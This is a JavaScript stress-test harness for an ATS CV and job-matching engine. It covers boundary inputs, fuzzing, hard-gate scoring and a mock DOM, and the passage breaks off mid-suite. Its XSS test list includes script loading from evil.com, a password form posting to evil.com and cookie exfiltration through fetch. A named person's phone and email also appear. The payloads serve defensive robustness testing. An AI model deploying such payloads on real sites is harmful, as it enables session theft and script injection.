/**
 * tests/stress_m2_harness.js
 *
 * Empirical Challenger Stress Harness for Milestone 2: ATS & Hard Gates Engine
 *
 * Stress Test Dimensions:
 * 1. Extreme & Boundary Inputs:
 *    - Empty string, whitespace-only (spaces, tabs, newlines, CRLF)
 *    - Extreme volume: 50,000 words (3.8M+ characters) execution benchmark
 *    - Non-string malformed types: null, undefined, numbers, boolean, objects, arrays, NaN, Infinity
 *    - Giant single token without spaces (100,000 chars ReDoS resilience)
 *    - HTML tags & script injection (16 XSS attack vectors)
 *    - Control chars, null bytes, bidirectional marks
 * 2. Statutory Hard Gates Adversarial Stress:
 *    - B.Sc. Engineer requirement penalty invariant (assert score <= 55% across 20+ variations)
 *    - Safety Officer requirement penalty invariant (assert score <= 55% across 15+ variations)
 *    - Combined Dual Gap penalty (B.Sc. + Safety Officer): assert score <= 55%
 *    - Practical Mechanical Engineer: assert status PASS
 *    - Certified Electrician: assert status IN_PROGRESS
 *    - Working at Heights: assert status PASS_REFRESH_RECOMMENDED
 *    - Hazmat & ASME/ISO gate checks
 * 3. Full Match Posting Invariant:
 *    - Multiple job descriptions matching Ido Gal's factual profile: assert score >= 85%
 * 4. 4-Bucket Keyword Taxonomy Integrity:
 *    - Methodologies, Financials, Systems, Energy bucket classification
 *    - Matched vs. Missing skill segregation
 * 5. ATS Structural Compliance Engine:
 *    - Single-column, standard fonts, zero-emoji guard, contact parseability
 * 6. UI Controllers & Mock DOM Stress:
 *    - Job selector edge cases, sample loading, clear, debounce, render functions
 * 7. High-Volume Fuzzing Loop:
 *    - 2,000 randomized mutated inputs verifying 0 unhandled exceptions & score bounds [0, 100]
 *
 * Run directly via macOS JavaScriptCore:
 *   /System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc tests/stress_m2_harness.js
 */

(function () {
  'use strict';

  if (typeof print === 'undefined') {
    globalThis.print = function() { console.log.apply(console, arguments); };
  }
  if (typeof quit === 'undefined') {
    globalThis.quit = function(code) { if (typeof process !== 'undefined') process.exit(code); };
  }
  if (typeof load === 'undefined' && typeof require !== 'undefined') {
    var fs = require('fs');
    var vm = require('vm');
    globalThis.load = function(p) {
      var code = fs.readFileSync(p, 'utf8');
      vm.runInThisContext(code);
    };
  }

  let totalTests = 0;
  let passedTests = 0;
  let failedTests = 0;
  const failureLog = [];

  function assert(condition, message) {
    totalTests++;
    if (condition) {
      passedTests++;
    } else {
      failedTests++;
      failureLog.push(message);
      print('  [FAIL] ' + message);
    }
  }

  function assertEqual(actual, expected, message) {
    totalTests++;
    if (actual === expected) {
      passedTests++;
    } else {
      failedTests++;
      const fullMsg = message + ' (Expected: ' + JSON.stringify(expected) + ', Actual: ' + JSON.stringify(actual) + ')';
      failureLog.push(fullMsg);
      print('  [FAIL] ' + fullMsg);
    }
  }

  function assertLessOrEqual(actual, maxVal, message) {
    totalTests++;
    if (actual <= maxVal) {
      passedTests++;
    } else {
      failedTests++;
      const fullMsg = message + ' (Expected <= ' + maxVal + ', Actual: ' + actual + ')';
      failureLog.push(fullMsg);
      print('  [FAIL] ' + fullMsg);
    }
  }

  function assertGreaterOrEqual(actual, minVal, message) {
    totalTests++;
    if (actual >= minVal) {
      passedTests++;
    } else {
      failedTests++;
      const fullMsg = message + ' (Expected >= ' + minVal + ', Actual: ' + actual + ')';
      failureLog.push(fullMsg);
      print('  [FAIL] ' + fullMsg);
    }
  }

  function assertDoesNotThrow(fn, message) {
    totalTests++;
    let threw = false;
    let err = null;
    try {
      fn();
    } catch (e) {
      threw = true;
      err = e;
    }
    if (!threw) {
      passedTests++;
    } else {
      failedTests++;
      const fullMsg = message + ' (Threw: ' + String(err) + ')';
      failureLog.push(fullMsg);
      print('  [FAIL] ' + fullMsg);
    }
  }

  // --- Initialize Mock Browser Environment for Headless JSC ---
  if (!globalThis.console) {
    globalThis.console = { log: print, warn: print, error: print, info: print };
  } else {
    if (!globalThis.console.warn) globalThis.console.warn = globalThis.console.log || print;
    if (!globalThis.console.error) globalThis.console.error = globalThis.console.log || print;
    if (!globalThis.console.info) globalThis.console.info = globalThis.console.log || print;
  }

  function createMockClassList(initialClasses) {
    const classes = new Set(initialClasses || []);
    return {
      add: function (c) { classes.add(c); },
      remove: function (c) { classes.delete(c); },
      contains: function (c) { return classes.has(c); },
      toggle: function (c, force) {
        if (force === undefined) {
          if (classes.has(c)) { classes.delete(c); return false; }
          else { classes.add(c); return true; }
        } else if (force) {
          classes.add(c); return true;
        } else {
          classes.delete(c); return false;
        }
      },
      toArray: function () { return Array.from(classes); }
    };
  }

  function createMockElement(id, initialClasses, initialDisplay) {
    const attrs = {};
    const children = [];
    return {
      id: id,
      tagName: 'DIV',
      nodeType: 1,
      style: { display: initialDisplay || '' },
      classList: createMockClassList(initialClasses),
      value: '',
      textContent: '',
      innerText: '',
      innerHTML: '',
      setAttribute: function (k, v) { attrs[k] = String(v); },
      getAttribute: function (k) { return attrs[k] !== undefined ? attrs[k] : null; },
      removeAttribute: function (k) { delete attrs[k]; },
      appendChild: function (child) { children.push(child); return child; },
      children: children,
      querySelectorAll: function () { return []; },
      querySelector: function () { return null; }
    };
  }

  const mockDomElements = {
    radarWorkspace: createMockElement('radarWorkspace', ['dashboard-view-container'], 'none'),
    careerStudioWorkspace: createMockElement('careerStudioWorkspace', ['dashboard-view-container', 'active'], 'block'),
    atsJobSelector: createMockElement('atsJobSelector', [], ''),
    atsJobInput: createMockElement('atsJobInput', [], ''),
    atsScoreValue: createMockElement('atsScoreValue', [], ''),
    atsGaugeProgress: createMockElement('atsGaugeProgress', [], ''),
    atsMatchBadge: createMockElement('atsMatchBadge', ['ats-match-level-badge'], ''),
    atsMatchBadgeText: createMockElement('atsMatchBadgeText', [], ''),
    atsScoreDescription: createMockElement('atsScoreDescription', [], ''),
    atsKpiGates: createMockElement('atsKpiGates', [], ''),
    atsKpiKeywords: createMockElement('atsKpiKeywords', [], ''),
    atsKpiStructural: createMockElement('atsKpiStructural', [], ''),
    atsGatesSummaryBadge: createMockElement('atsGatesSummaryBadge', [], ''),
    atsKeywordsCountBadge: createMockElement('atsKeywordsCountBadge', [], ''),
    atsHardGatesList: createMockElement('atsHardGatesList', [], ''),
    atsKeywordsMethodologies: createMockElement('atsKeywordsMethodologies', [], ''),
    atsKeywordsFinancials: createMockElement('atsKeywordsFinancials', [], ''),
    atsKeywordsSystems: createMockElement('atsKeywordsSystems', [], ''),
    atsKeywordsEnergy: createMockElement('atsKeywordsEnergy', [], ''),
    atsRulesChecklist: createMockElement('atsRulesChecklist', [], '')
  };

  const timerQueue = [];
  let nextTimerId = 1;

  globalThis.window = globalThis;
  globalThis.window.addEventListener = function () {};
  globalThis.window.removeEventListener = function () {};
  globalThis.window.location = { hash: '#studio' };
  globalThis.window.localStorage = {
    _data: {},
    getItem: function (k) { return this._data[k] || null; },
    setItem: function (k, v) { this._data[k] = String(v); },
    removeItem: function (k) { delete this._data[k]; }
  };
  globalThis.localStorage = globalThis.window.localStorage;
  globalThis.setTimeout = function (fn, delay) {
    const id = nextTimerId++;
    timerQueue.push({ id: id, fn: fn, delay: delay, cancelled: false });
    return id;
  };
  globalThis.clearTimeout = function (id) {
    for (let i = 0; i < timerQueue.length; i++) {
      if (timerQueue[i].id === id) timerQueue[i].cancelled = true;
    }
  };

  globalThis.document = {
    addEventListener: function () {},
    removeEventListener: function () {},
    getElementById: function (id) { return mockDomElements[id] || null; },
    querySelector: function (sel) { return null; },
    querySelectorAll: function (sel) { return []; },
    createElement: function (tag) {
      const el = createMockElement('elem_' + Math.random().toString(36).substring(2, 7));
      el.tagName = String(tag).toUpperCase();
      return el;
    }
  };

  function flushTimers() {
    const toRun = timerQueue.slice();
    timerQueue.length = 0;
    for (let i = 0; i < toRun.length; i++) {
      if (!toRun[i].cancelled) toRun[i].fn();
    }
  }

  // --- Load dashboard.js into JavaScriptCore ---
  print('Loading frontend/js/dashboard.js into JSC...');
  try {
    load('frontend/js/dashboard.js');
    print('[OK] frontend/js/dashboard.js successfully loaded.\n');
  } catch (err) {
    print('[FATAL] Failed to load dashboard.js: ' + err);
    quit(1);
  }

  // Verify critical exports
  assert(typeof window.runAtsJobMatching === 'function', 'runAtsJobMatching must be exported on window');
  assert(typeof window.evaluateHardGates === 'function', 'evaluateHardGates must be exported on window');
  assert(typeof window.extractMissingKeywords === 'function', 'extractMissingKeywords must be exported on window');
  assert(typeof window.checkAtsStructuralCompliance === 'function', 'checkAtsStructuralCompliance must be exported on window');
  assert(Array.isArray(window.STATUTORY_HARD_GATES), 'STATUTORY_HARD_GATES must be an array');
  assert(typeof window.KEYWORD_TAXONOMY === 'object', 'KEYWORD_TAXONOMY must be an object');
  assert(Array.isArray(window.ATS_STRUCTURAL_RULES), 'ATS_STRUCTURAL_RULES must be an array');
  assert(typeof window.CANONICAL_CV_PROFILE === 'object', 'CANONICAL_CV_PROFILE must be an object');

  // =========================================================================
  // SUITE 1: Extreme Inputs & Boundary Values
  // =========================================================================
  print('--- Suite 1: Extreme Inputs & Boundary Values ---');

  (function testExtremeInputs() {
    // 1. Empty string
    const resEmpty = window.runAtsJobMatching('');
    assertEqual(resEmpty.matchScore, 0, 'Empty string must return matchScore 0');
    assertEqual(resEmpty.hardGates.length, 0, 'Empty string must yield 0 hard gates');

    // 2. Whitespace variants
    const whitespaces = [
      ' ',
      '   ',
      '\t',
      '\n',
      '\r\n',
      ' \t \n \r \t  ',
      '\u00A0  \u00A0'
    ];
    whitespaces.forEach((ws, idx) => {
      const resWs = window.runAtsJobMatching(ws);
      assertEqual(resWs.matchScore, 0, 'Whitespace variant ' + idx + ' must return matchScore 0');
      assertEqual(resWs.hardGates.length, 0, 'Whitespace variant ' + idx + ' must yield 0 hard gates');
    });

    // 3. Non-string types (null, undefined, numbers, boolean, objects, arrays, NaN, Infinity)
    const malformedInputs = [
      null,
      undefined,
      0,
      1,
      -999,
      42.5,
      NaN,
      Infinity,
      -Infinity,
      true,
      false,
      {},
      { title: 'Engineer' },
      [],
      ['SCADA', 'PRMS'],
      function () {}
    ];
    malformedInputs.forEach((badInput, idx) => {
      assertDoesNotThrow(() => {
        const resBad = window.runAtsJobMatching(badInput);
        assertEqual(resBad.matchScore, 0, 'Malformed input [' + typeof badInput + '] #' + idx + ' must return matchScore 0');
      }, 'Malformed input #' + idx + ' must not throw exception');
    });

    // 4. Extreme volume: 50,000 words text (3.8M+ characters)
    print('  Benchmarking 50,000 words input...');
    const words = [];
    for (let i = 0; i < 50000; i++) {
      words.push('word' + i + ' בדיקה הנדסה מכונות SCADA PRMS Energean gas pipeline valve SCADA test');
    }
    const hugeText = words.join(' ');
    assert(hugeText.length > 3000000, 'hugeText must exceed 3,000,000 characters');

    const t0 = Date.now();
    let resHuge = null;
    assertDoesNotThrow(() => {
      resHuge = window.runAtsJobMatching(hugeText);
    }, '50,000 words text must execute without throwing');
    const elapsedMs = Date.now() - t0;

    print('  50,000 words benchmark finished in ' + elapsedMs + ' ms.');
    assertLessOrEqual(elapsedMs, 1000, '50,000 words parsing must complete in under 1000ms');
    assert(resHuge !== null, 'resHuge must not be null');
    assert(typeof resHuge.matchScore === 'number', 'matchScore must be a number');
    assertGreaterOrEqual(resHuge.matchScore, 0, 'resHuge.matchScore >= 0');
    assertLessOrEqual(resHuge.matchScore, 100, 'resHuge.matchScore <= 100');
    assert(Array.isArray(resHuge.hardGates), 'resHuge.hardGates must be an array');
    assert(typeof resHuge.missingKeywords === 'object', 'resHuge.missingKeywords must be an object');
    assert(typeof resHuge.matchedKeywords === 'object', 'resHuge.matchedKeywords must be an object');

    // 5. Giant single token without whitespace (100,000 characters) - ReDoS resistance
    print('  Testing 100,000 char continuous token for ReDoS resilience...');
    const continuousToken = 'a'.repeat(100000);
    const tReDoS = Date.now();
    assertDoesNotThrow(() => {
      const resToken = window.runAtsJobMatching(continuousToken);
      assertLessOrEqual(resToken.matchScore, 70, 'Continuous non-matching token returns score <= 70');
    }, 'Continuous 100k char token must not hang or throw');
    const elapsedReDoS = Date.now() - tReDoS;
    assertLessOrEqual(elapsedReDoS, 150, 'Continuous token must evaluate in < 150ms');

    // 6. HTML & Script Injection (XSS attack vectors)
    print('  Testing HTML and Script Injection payloads...');
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<script src="https://evil.com/payload.js"></script>',
      '<img src="x" onerror="alert(1)">',
      '<svg/onload=alert("xss")>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '"><script>prompt(document.cookie)</script>',
      '<b>Bold</b><i>Italic</i><h1>Header</h1>',
      '<div style="color:red" onclick="alert(1)">Click</div>',
      '<!-- HTML Comment --> and &lt;script&gt;',
      '<a href="javascript:void(0)">Link</a> דרוש הנדסאי מכונות SCADA',
      '<form action="https://evil.com"><input type="password"></form>',
      '<<SCRIPT>alert("XSS");//<</SCRIPT>',
      '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
      '<body onload=alert(1)>',
      '<style>body { display: none; }</style>',
      'דרוש הנדסאי מכונות <script>fetch("/steal?cookie="+document.cookie)</script> PRMS SCADA'
    ];

    xssPayloads.forEach((payload, idx) => {
      assertDoesNotThrow(() => {
        const resXss = window.runAtsJobMatching(payload);
        assert(typeof resXss.matchScore === 'number', 'XSS payload #' + idx + ' must return numeric matchScore');
        assert(typeof resXss.summary === 'string', 'XSS payload #' + idx + ' must return string summary');
      }, 'XSS payload #' + idx + ' must not throw');
    });

    // 7. Null bytes, control characters, bidirectional marks
    const weirdChars = [
      'דרוש \x00\x01\x02 הנדסאי מכונות SCADA',
      'דרוש \u202E תואר ראשון \u202C הנדסאי מכונות',
      'דרוש \u200B\u200C\u200D הנדסאי מכונות',
      'דרוש הנדסאי מכונות \t\t\t\t SCADA \r\n\r\n PRMS'
    ];
    weirdChars.forEach((txt, idx) => {
      assertDoesNotThrow(() => {
        const resWeird = window.runAtsJobMatching(txt);
        assert(typeof resWeird.matchScore === 'number', 'Control char payload #' + idx + ' parsed');
      }, 'Control char payload #' + idx + ' must not throw');
    });
  })();

  // =========================================================================
  // SUITE 2: Statutory Hard Gates Adversarial Stress
  // =========================================================================
  print('--- Suite 2: Statutory Hard Gates Adversarial Stress ---');

  (function testStatutoryHardGates() {
    // 1. B.Sc. Engineer requirement penalty: MUST ALWAYS BE <= 55%
    print('  Testing B.Sc. Engineer penalty invariant (score <= 55%)...');
    const bscVariations = [
      'דרוש תואר ראשון בהנדסת מכונות',
      'דרוש תואר ראשון בהנדסת חשמל',
      'דרוש תואר ראשון בהנדסה',
      'דרוש מהנדס מכונות',
      'חובה מהנדס מכונות מוסמך',
      'דרוש מהנדס חשמל לתחנת כוח',
      'מהנדס מכונות מנוסה עם ניסיון של 5 שנים',
      'מהנדס חשמל ראשי',
      'דרישת סף: תואר ראשון בהנדסת מכונות B.Sc',
      'תואר ראשון בהנדסה B.Sc ממוסד אקדמי מוכר',
      'B.Sc. in mechanical engineering required',
      'B.Sc in Electrical Engineering',
      'B.Sc. Mechanical Engineering',
      'B.Sc electrical engineering',
      'bsc in mechanical engineering',
      'b.sc in electrical engineering',
      'bsc in electrical engineering',
      'Requirements: B.Sc. in Mechanical Engineering or Electrical Engineering',
      'B.Sc in mechanical engineering only - no practical engineers',
      'Seeking B.Sc. Mechanical Engineer',
      'We require a B.Sc. Electrical Engineer for the facility',
      'B.Sc Mechanical Engineer with gas background'
    ];

    const fullMatchContext = ' דרוש בקר גז טבעי ותפעול מתקני אנרגיה 24/7. הנדסאי מכונות מוסמך רופין, שליטה מלאה ב-SCADA, PRMS, אסדת הפקה FPSO, נומינציות מול נתג״ז, משמרות 24/7 Energean.';

    bscVariations.forEach((bscReq, idx) => {
      // Test standalone
      const resStandalone = window.runAtsJobMatching(bscReq);
      assertLessOrEqual(
        resStandalone.matchScore,
        55,
        'B.Sc. standalone #' + idx + ' [' + bscReq + '] MUST be <= 55%. Got: ' + resStandalone.matchScore
      );
      const bscGate1 = resStandalone.hardGates.find(g => g.id === 'gate_degree_bsc_engineer');
      assert(bscGate1 !== undefined, 'B.Sc. standalone #' + idx + ' [' + bscReq + '] must detect gate_degree_bsc_engineer');
      assertEqual(bscGate1 && bscGate1.status, 'GAP', 'B.Sc. standalone #' + idx + ' status must be GAP');

      // Test combined with 100% full match profile
      const resCombined = window.runAtsJobMatching(bscReq + fullMatchContext);
      assertLessOrEqual(
        resCombined.matchScore,
        55,
        'B.Sc. combined #' + idx + ' [' + bscReq + '] MUST NEVER exceed 55% even with full matching skills. Got: ' + resCombined.matchScore
      );
      const bscGate2 = resCombined.hardGates.find(g => g.id === 'gate_degree_bsc_engineer');
      assert(bscGate2 !== undefined, 'B.Sc. combined #' + idx + ' must detect gate_degree_bsc_engineer');
      assertEqual(bscGate2 && bscGate2.status, 'GAP', 'B.Sc. combined #' + idx + ' status must be GAP');
      assert(
        resCombined.summary.indexOf('פער סף סטטוטורי') !== -1,
        'B.Sc. combined #' + idx + ' summary must report statutory gap'
      );
    });

    // 2. Safety Officer requirement penalty: MUST ALWAYS BE <= 55%
    print('  Testing Safety Officer penalty invariant (score <= 55%)...');
    const safetyVariations = [
      'דרוש ממונה בטיחות',
      'דרוש ממונה בטיחות בעבודה',
      'דרישת סף: ממונה בטיחות מוסמך',
      'חובה רישיון ממונה בטיחות בעבודה',
      'ממונה בטיחות בעבודה מוסמך מטעם משרד העבודה',
      'certified safety officer required',
      'Certified Safety Officer on site',
      'safety officer with industrial plant certification',
      'certified safety manager',
      'Certified Safety Manager'
    ];

    safetyVariations.forEach((safetyReq, idx) => {
      // Test standalone
      const resStandalone = window.runAtsJobMatching(safetyReq);
      assertLessOrEqual(
        resStandalone.matchScore,
        55,
        'Safety Officer standalone #' + idx + ' [' + safetyReq + '] MUST be <= 55%. Got: ' + resStandalone.matchScore
      );
      const safetyGate1 = resStandalone.hardGates.find(g => g.id === 'gate_safety_officer');
      assert(safetyGate1 !== undefined, 'Safety Officer standalone #' + idx + ' must detect gate_safety_officer');
      assertEqual(safetyGate1 && safetyGate1.status, 'GAP', 'Safety Officer standalone #' + idx + ' status must be GAP');

      // Test combined with 100% full match profile
      const resCombined = window.runAtsJobMatching(safetyReq + fullMatchContext);
      assertLessOrEqual(
        resCombined.matchScore,
        55,
        'Safety Officer combined #' + idx + ' MUST NEVER exceed 55% even with full matching skills. Got: ' + resCombined.matchScore
      );
      const safetyGate2 = resCombined.hardGates.find(g => g.id === 'gate_safety_officer');
      assert(safetyGate2 !== undefined, 'Safety Officer combined #' + idx + ' must detect gate_safety_officer');
      assertEqual(safetyGate2 && safetyGate2.status, 'GAP', 'Safety Officer combined #' + idx + ' status must be GAP');
      assert(
        resCombined.summary.indexOf('פער סף סטטוטורי') !== -1,
        'Safety Officer combined #' + idx + ' summary must report statutory gap'
      );
    });

    // 3. Combined Dual Hard Gate Gaps (B.Sc. Engineer AND Safety Officer)
    print('  Testing Dual Gap postings (B.Sc. + Safety Officer)...');
    const dualGapJobs = [
      'דרוש מהנדס מכונות B.Sc וגם ממונה בטיחות בעבודה',
      'מהנדס חשמל מוסמך + תעודת ממונה בטיחות',
      'B.Sc. in mechanical engineering and certified safety officer'
    ];
    dualGapJobs.forEach((job, idx) => {
      const resDual = window.runAtsJobMatching(job + fullMatchContext);
      assertLessOrEqual(resDual.matchScore, 55, 'Dual gap job #' + idx + ' score <= 55%. Got: ' + resDual.matchScore);
      assertGreaterOrEqual(resDual.matchScore, 0, 'Dual gap job #' + idx + ' score >= 0%');
      const bsc = resDual.hardGates.find(g => g.id === 'gate_degree_bsc_engineer');
      const safety = resDual.hardGates.find(g => g.id === 'gate_safety_officer');
      assert(bsc && bsc.status === 'GAP', 'Dual gap job #' + idx + ' has B.Sc GAP');
      assert(safety && safety.status === 'GAP', 'Dual gap job #' + idx + ' has Safety Officer GAP');
    });

    // 4. Practical Mechanical Engineer qualification verification (PASS)
    print('  Testing Practical Mechanical Engineer qualification (PASS)...');
    const mechVariations = [
      'דרוש הנדסאי מכונות',
      'דרוש הנדסאי מכונות מוסמך',
      'דרוש practical mechanical engineer למתקן תעשייתי',
      'דרוש mechanical practical engineer'
    ];
    mechVariations.forEach((mech, idx) => {
      const gates = window.evaluateHardGates(mech);
      const gate = gates.find(g => g.id === 'gate_practical_mech_eng');
      assert(gate !== undefined, 'Practical mech eng #' + idx + ' detected');
      assertEqual(gate && gate.status, 'PASS', 'Practical mech eng #' + idx + ' status is PASS');
    });

    // 5. Certified Electrician qualification verification (IN_PROGRESS)
    print('  Testing Certified Electrician qualification (IN_PROGRESS)...');
    const elecVariations = [
      'חובה רישיון חשמלאי מוסמך',
      'certified electrician required',
      'licensed electrician for substation'
    ];
    elecVariations.forEach((elec, idx) => {
      const gates = window.evaluateHardGates(elec);
      const gate = gates.find(g => g.id === 'gate_certified_electrician');
      assert(gate !== undefined, 'Electrician #' + idx + ' detected');
      assertEqual(gate && gate.status, 'IN_PROGRESS', 'Electrician #' + idx + ' status is IN_PROGRESS');
    });

    // 6. Working at Heights (PASS_REFRESH_RECOMMENDED)
    const heightsGates = window.evaluateHardGates('דרוש עובד בעל הסמכת עבודה בגובה בתוקף');
    const hGate = heightsGates.find(g => g.id === 'gate_working_at_heights');
    assert(hGate !== undefined, 'Working at heights detected');
    assertEqual(hGate && hGate.status, 'PASS_REFRESH_RECOMMENDED', 'Working at heights status PASS_REFRESH_RECOMMENDED');
  })();

  // =========================================================================
  // SUITE 3: Full Match Posting for Ido Gal's Profile (Score >= 85%)
  // =========================================================================
  print('--- Suite 3: Full Match Posting Invariant (Score >= 85%) ---');

  (function testFullMatchPostings() {
    const fullMatchJobs = [
      {
        name: 'Gas Controller Energean Operational Match',
        text: 'דרוש בקר גז טבעי ותפעול מתקני אנרגיה 24/7 בחברת Energean. ' +
              'דרישות התפקיד: הנדסאי מכונות מוסמך בוגר רופין, שליטה מלאה במערכות בקרה SCADA ומתקני הפחתת לחץ ומדידה PRMS, ' +
              'ניסיון באסדת הפקה FPSO, ניהול נומינציות מול נתג״ז, עבודה במשמרות 24/7.'
      },
      {
        name: 'Natural Gas Controller International English Match',
        text: 'Gas Controller and Energy Operations Specialist at Energean. ' +
              'Requirements: Practical Mechanical Engineer diploma, SCADA supervisory control, PRMS pressure reduction stations, ' +
              'FPSO offshore interface, natural gas pipeline monitoring, 24/7 shift operations.'
      },
      {
        name: 'Solar PV & Storage Field Operations Match',
        text: 'דרוש מנהל תפעול מתקני אנרגיה סולארית PV. ' +
              'דרישות התפקיד: הנדסאי מכונות, ניסיון מעשי בפאנלים Bifacial PV, ' +
              'חשמלאי מוסמך (בלימודים לקראת סיום), הדרכת עבודה בגובה, מערכות SCADA.'
      },
      {
        name: 'Gas Transmission & ASME Station Operator',
        text: 'דרוש מפעיל מתקן אנרגיה והולכת גז טבעי. ' +
              'דרישות: הנדסאי מכונות, מערכות SCADA, תחנות PRMS, תקני ASME, עבודה בגובה.'
      }
    ];

    fullMatchJobs.forEach((job, idx) => {
      const res = window.runAtsJobMatching(job.text);
      print('  Job: ' + job.name + ' -> Score: ' + res.matchScore + '%');
      assertGreaterOrEqual(
        res.matchScore,
        85,
        'Full match job #' + idx + ' (' + job.name + ') MUST achieve score >= 85%. Got: ' + res.matchScore
      );
      assertLessOrEqual(res.matchScore, 100, 'Score must not exceed 100%');

      // Assert no GAP in hard gates
      const hasGap = res.hardGates.some(g => g.status === 'GAP');
      assert(!hasGap, 'Full match job #' + idx + ' must not have any hard gate GAP');

      // Assert practical mech eng is present if required
      if (job.text.indexOf('הנדסאי מכונות') !== -1 || job.text.indexOf('Practical Mechanical Engineer') !== -1) {
        const mech = res.hardGates.find(g => g.id === 'gate_practical_mech_eng');
        assert(mech !== undefined && mech.status === 'PASS', 'Full match job #' + idx + ' has PASS on practical mech eng');
      }

      // Assert matched keywords populated
      const totalMatched = res.matchedKeywords.methodologies.length +
                           res.matchedKeywords.financials.length +
                           res.matchedKeywords.systems.length +
                           res.matchedKeywords.energy.length;
      assertGreaterOrEqual(totalMatched, 1, 'Full match job #' + idx + ' must match at least 1 keyword');
    });
  })();

  // =========================================================================
  // SUITE 4: 4-Bucket Keyword Taxonomy Integrity
  // =========================================================================
  print('--- Suite 4: 4-Bucket Keyword Taxonomy Integrity ---');

  (function testKeywordTaxonomy() {
    const categories = Object.keys(window.KEYWORD_TAXONOMY);
    assertEqual(categories.length, 4, 'Must have exactly 4 keyword categories');
    assertEqual(categories[0], 'methodologies', 'Category 1: methodologies');
    assertEqual(categories[1], 'financials', 'Category 2: financials');
    assertEqual(categories[2], 'systems', 'Category 3: systems');
    assertEqual(categories[3], 'energy', 'Category 4: energy');

    // Test specific keywords
    const testCases = [
      { text: 'דרוש ידע ב-Lean ו-Six Sigma', cat: 'methodologies', terms: ['Lean', 'Six Sigma'], isMissing: true },
      { text: 'ניהול תקציב CAPEX ו-OPEX', cat: 'financials', terms: ['CAPEX', 'OPEX'], isMissing: true },
      { text: 'תפעול בקרים מתוכנתים PLC ו-HMI', cat: 'systems', terms: ['PLC', 'HMI'], isMissing: true },
      { text: 'מערכות אגירת אנרגיה BESS ומתח גבוה High Voltage', cat: 'energy', terms: ['BESS', 'High Voltage'], isMissing: true },
      { text: 'שליטה במערכות SCADA ותחנות PRMS', cat: 'systems', terms: ['SCADA', 'PRMS'], isMissing: false },
      { text: 'עבודה מול אסדת הפקה FPSO ופאנלים Bifacial', cat: 'energy', terms: ['FPSO', 'Bifacial PV'], isMissing: false }
    ];

    testCases.forEach((tc, idx) => {
      const res = window.extractMissingKeywords(tc.text, window.CANONICAL_CV_PROFILE);
      tc.terms.forEach(term => {
        if (tc.isMissing) {
          assert(
            res[tc.cat].indexOf(term) !== -1,
            'Missing keyword check #' + idx + ': ' + term + ' must be in missing ' + tc.cat
          );
          assert(
            res.matched[tc.cat].indexOf(term) === -1,
            'Missing keyword check #' + idx + ': ' + term + ' must not be in matched ' + tc.cat
          );
        } else {
          assert(
            res.matched[tc.cat].indexOf(term) !== -1,
            'Matched keyword check #' + idx + ': ' + term + ' must be in matched ' + tc.cat
          );
          assert(
            res[tc.cat].indexOf(term) === -1,
            'Matched keyword check #' + idx + ': ' + term + ' must not be in missing ' + tc.cat
          );
        }
      });
    });
  })();

  // =========================================================================
  // SUITE 5: ATS Structural Compliance Engine
  // =========================================================================
  print('--- Suite 5: ATS Structural Compliance Engine ---');

  (function testAtsStructuralCompliance() {
    // 1. Structural check with headless null element
    const headlessRep = window.checkAtsStructuralCompliance(null);
    assertEqual(headlessRep.rules_checked, 4, 'Headless compliance checks 4 rules');

    // 2. Multi-column table layout violation
    const mockMultiColElem = createMockElement('cvMockMultiCol');
    mockMultiColElem.textContent = window.CANONICAL_CV_PROFILE.text;
    mockMultiColElem.querySelectorAll = function (sel) {
      if (sel.indexOf('table') !== -1 || sel.indexOf('multi-column') !== -1) {
        return [createMockElement('table1')];
      }
      return [];
    };
    const repMultiCol = window.checkAtsStructuralCompliance(mockMultiColElem);
    assertEqual(repMultiCol.passed, false, 'Multi-column layout must fail structural compliance');
    assert(
      repMultiCol.issues.some(i => i.rule_id === 'ats_single_column'),
      'Multi-column layout must flag ats_single_column issue'
    );

    // 3. Floating DIVs violation
    const mockFloatElem = createMockElement('cvMockFloat');
    mockFloatElem.textContent = window.CANONICAL_CV_PROFILE.text;
    mockFloatElem.querySelectorAll = function (sel) {
      if (sel.indexOf('float') !== -1) {
        return [createMockElement('divFloat')];
      }
      return [];
    };
    const repFloat = window.checkAtsStructuralCompliance(mockFloatElem);
    assertEqual(repFloat.passed, false, 'Floating divs must fail structural compliance');
    assert(
      repFloat.issues.some(i => i.rule_id === 'ats_single_column'),
      'Floating divs must flag ats_single_column issue'
    );

    // 4. Emoji violation in CV
    const mockEmojiElem = createMockElement('cvMockEmoji');
    // Using fromCharCode to avoid any literal emoji in source file
    const emojiChar = String.fromCharCode(0xD83D, 0xDE80); // rocket emoji
    mockEmojiElem.textContent = 'עידו גל בקר גז טבעי ' + emojiChar + ' טלפון 052-632-8886 דואל idogal0210@gmail.com';
    const repEmoji = window.checkAtsStructuralCompliance(mockEmojiElem);
    assertEqual(repEmoji.passed, false, 'Emoji in CV must fail ATS structural compliance');
    assert(
      repEmoji.issues.some(i => i.rule_id === 'ats_zero_emojis'),
      'Emoji in CV must flag ats_zero_emojis rule'
    );
    const emojiIssue = repEmoji.issues.find(i => i.rule_id === 'ats_zero_emojis');
    assertEqual(emojiIssue && emojiIssue.severity, 'CRITICAL', 'ats_zero_emojis severity must be CRITICAL');

    // 5. Contact parseability with Israeli format in live DOM
    const mockLiveCvElem = createMockElement('careerStudioCvCanvas');
    mockLiveCvElem.textContent = window.CANONICAL_CV_PROFILE.text;
    const repLiveCv = window.checkAtsStructuralCompliance(mockLiveCvElem);
    assertEqual(
      repLiveCv.passed,
      true,
      'Canonical Israeli phone format 052-632-8886 must pass ATS structural compliance in live DOM'
    );
    assertEqual(
      repLiveCv.score,
      100,
      'Canonical CV profile must achieve 100% structural compliance score in live DOM'
    );
  })();

  // =========================================================================
  // SUITE 6: UI Controller & Mock DOM Stress
  // =========================================================================
  print('--- Suite 6: UI Controller & Mock DOM Stress ---');

  (function testUiControllers() {
    assertDoesNotThrow(() => {
      window.initAtsModule();
    }, 'initAtsModule must not throw');

    assertDoesNotThrow(() => {
      window.populateAtsJobSelector();
    }, 'populateAtsJobSelector must not throw');

    // Load sample jobs
    assertDoesNotThrow(() => {
      window.loadSampleAtsJob('gas');
    }, 'loadSampleAtsJob("gas") must not throw');
    assertGreaterOrEqual(
      parseInt(mockDomElements.atsScoreValue.textContent, 10),
      85,
      'Gas sample job achieves score >= 85%'
    );

    assertDoesNotThrow(() => {
      window.loadSampleAtsJob('solar');
